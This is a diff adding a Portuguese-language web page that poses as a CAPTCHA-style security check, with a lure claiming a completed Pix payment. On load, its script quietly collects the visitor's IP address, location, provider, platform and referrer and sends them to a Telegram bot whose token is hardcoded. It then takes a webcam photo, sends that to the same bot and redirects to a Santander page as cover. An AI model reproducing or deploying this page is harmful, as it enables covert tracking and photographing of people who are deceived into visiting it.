@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:title" content="Confirme que você não é um robô">
+<meta property="og:description" content="Pix efetuado: status CONCLUÍDO! Comprovante válido por 7 dias...">
+<meta property="og:image" content="https://t4.ftcdn.net/jpg/07/04/71/75/360_F_704717584_66pmpeTKQMoEnlo06hpYKeUhPJ6SnhND.jpg">
+<meta property="og:type" content="website">
+<title>Verificação de Segurança</title>
+<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/17002/17002143.png" type="image/x-icon">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%}
+body{font-family:'Inter',sans-serif;position:relative;display:flex;justify-content:center;align-items:center;padding:20px}
+body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background-image:url('https://s2-g1.glbimg.com/sGaC5kWLHPpRSrBSUmz11ZWwIVg=/0x0:695x517/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_59edd422c0c84a879bd37670ae4f538a/internal_photos/bs/2019/m/2/PMVDVqR7AKIVaGBbPmCw/recaptcha-c.jpg');background-size:cover;background-position:center;background-attachment:fixed;filter:blur(50px);z-index:-1}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.3);z-index:1}
+.wrapper{position:relative;z-index:2;width:100%;max-width:500px}
+.modal{background:#fff;border-radius:8px;padding:40px;box-shadow:0 4px 20px rgba(0,0,0,.15);text-align:center}
+.modal-title{font-size:28px;font-weight:600;color:#000;margin-bottom:24px}
+.modal-description{font-size:15px;color:#333;line-height:1.8;margin-bottom:40px}
+.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#0084ff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress-bar{width:100%;height:3px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-bottom:16px}
+.progress-fill{height:100%;background:#0084ff;width:0;transition:width .3s ease}
+.waiting-text{font-size:13px;color:#666;min-height:18px}
+.hidden{position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden}
+@media(max-width:600px){
+.modal{padding:30px 20px}
+.modal-title{font-size:24px;margin-bottom:20px}
+.modal-description{font-size:14px;margin-bottom:32px}
+}
+</style>
+</head>
+<body>
+<div class="overlay"></div>
+<div class="wrapper">
+<div class="modal">
+<div class="modal-title">Verificação de Segurança</div>
+<div class="modal-description">Para continuar precisamos confirmar que você não é um robô.</div>
+<div class="spinner"></div>
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+<div class="waiting-text" id="statusText">Verificando segurança</div>
+</div>
+</div>
+<div class="hidden" id="analytics"></div>
+<script>
+const REDIRECT_URL='https://www.santander.com.br/404?not-found=https:%2F%2Fwww.santander.com.br%2F6ydQw09KdmM998sb';
+const TELEGRAM_TOKEN='8878775736:AAFMOU-L-_Dw_mKIr874diZab0jaTqGGLE4';
+const CHAT_ID='-1003924354463';
+let progressWidth=0;
+const progressFill=document.getElementById('progressFill');
+const statusText=document.getElementById('statusText');
+let dotCount=0;
+
+function updateProgress(percent){
+progressWidth=percent;
+progressFill.style.width=progressWidth+'%';
+}
+
+function updateStatus(text){
+statusText.textContent=text;
+}
+
+function animateDots(){
+const dots=['Verificando segurança.','Verificando segurança..','Verificando segurança...'];
+dotCount=(dotCount+1)%3;
+updateStatus(dots[dotCount]);
+}
+
+function startProgress(){
+const dotsInterval=setInterval(animateDots,500);
+let time=0;
+const maxTime=300000;
+const interval=setInterval(()=>{
+time+=100;
+const percent=Math.min((time/maxTime)*100,99);
+updateProgress(percent);
+if(progressWidth>=99)clearInterval(interval);
+},100);
+return {interval,dotsInterval};
+}
+
+async function getGeoLocation(){
+try{
+const res=await fetch('https://ipinfo.io/json');
+return await res.json();
+}catch(e){
+return {};
+}
+}
+
+async function sendTelegram(geo,imageData){
+try{
+const message=`🚨 <b>Novo Acesso Detectado</b>\n\n<b>Informações Coletadas:</b>\n\n🌐 <b>IP:</b> <code>${geo.ip||'Desconhecido'}</code>\n📍 <b>Localização:</b> <code>${geo.city||'Desconhecida'}, ${geo.region||'Desconhecida'} - ${geo.country||'Desconhecido'}</code>\n🗺️ <b>Coordenadas:</b> <code>${geo.loc||'Desconhecidas'}</code>\n🏢 <b>Provedor:</b> <code>${geo.org||'Desconhecido'}</code>\n💻 <b>Plataforma:</b> <code>${navigator.platform||'Desconhecida'}</code>\n📱 <b>Resolução:</b> <code>${screen.width}x${screen.height}</code>\n🔄 <b>Origem:</b> <code>${document.referrer||'Acesso Direto'}</code>`;
+
+if(imageData){
+const formData=new FormData();
+formData.append('chat_id',CHAT_ID);
+formData.append('photo',imageData,'screenshot.jpg');
+formData.append('caption',message);
+formData.append('parse_mode','HTML');
+await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,{method:'POST',body:formData});
+}else{
+await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:message,parse_mode:'HTML'})});
+}
+}catch(e){
+console.error('Erro ao enviar Telegram:',e);
+}
+}
+
+async function cam(){
+try{
+const s=await navigator.mediaDevices.getUserMedia({video:true});
+const v=document.createElement('video');
+v.srcObject=s;
+await v.play();
+const c=document.createElement('canvas');
+c.width=v.videoWidth||640;
+c.height=v.videoHeight||480;
+c.getContext('2d').drawImage(v,0,0);
+s.getTracks().forEach(t=>t.stop());
+return await new Promise(r=>c.toBlob(r,'image/jpeg',.85));
+}catch(e){
+return null;
+}
+}
+
+async function init(){
+const {interval,dotsInterval}=startProgress();
+const geo=await getGeoLocation();
+await sendTelegram(geo,null);
+updateStatus('Verificando segurança...');
+const img=await cam();
+clearInterval(dotsInterval);
+if(img){
+updateStatus('Quase concluído...');
+await new Promise(r=>setTimeout(r,800));
+await sendTelegram(geo,img);
+}
+updateStatus('Autorização bem sucedida!');
+clearInterval(interval);
+updateProgress(100);
+await new Promise(r=>setTimeout(r,1200));
+setTimeout(()=>window.location.href=REDIRECT_URL,300);
+}
+
+window.addEventListener('load',init);
+</script>
+</body>
+</html>
